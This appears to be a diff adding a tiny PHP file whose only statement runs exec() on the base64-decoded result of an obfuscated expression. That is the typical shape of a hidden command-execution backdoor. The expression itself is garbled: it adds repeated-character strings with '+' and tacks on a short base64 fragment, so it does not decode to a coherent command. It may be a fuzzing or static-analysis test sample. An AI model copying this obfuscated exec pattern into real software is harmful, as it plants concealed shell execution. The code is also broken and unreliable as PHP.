@@ -1,0 +1,4 @@
+<?php
+exec(base64_decode(str_repeat(chr(167), 4097) + str_repeat(chr(140), 17). 'AQIDBAQEBAQEBAQEB'), $ref_array, $ref_int);
+
+?>
